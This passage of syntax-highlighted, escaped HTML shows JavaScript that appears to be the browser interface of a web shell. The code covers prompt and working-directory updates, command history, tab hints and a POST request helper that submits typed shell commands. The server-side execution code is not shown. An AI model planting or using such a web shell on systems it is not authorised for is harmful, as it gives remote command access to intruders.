class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nx\"\u003eCWD\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nx\"\u003e_updatePrompt\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003emakeRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;?feature=pwd\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{},\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nx\"\u003eCWD\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eatob\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecwd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nx\"\u003e_updatePrompt\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003eescapeHtml\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026amp;/\u003c/span\u003e\u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026amp;amp;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026amp;lt;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u0026gt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003eg\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026amp;gt;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003e_updatePrompt\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eeShellPrompt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-prompt\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eeShellPrompt\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003egenPrompt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCWD\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003e_onShellCmdKeyDown\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eswitch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enter\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003efeatureShell\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003einsertToHistory\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ArrowUp\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e\u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eblur\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003e_defer\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efocus\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ArrowDown\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eblur\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efocus\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Tab\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epreventDefault\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"nx\"\u003efeatureHint\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003einsertToHistory\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecmd\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003ehistoryPosition\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecommandHistory\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003emakeRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003egetQueryString\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e \u003cspan class=\"nx\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;=\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026amp;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;POST\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Content-Type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan 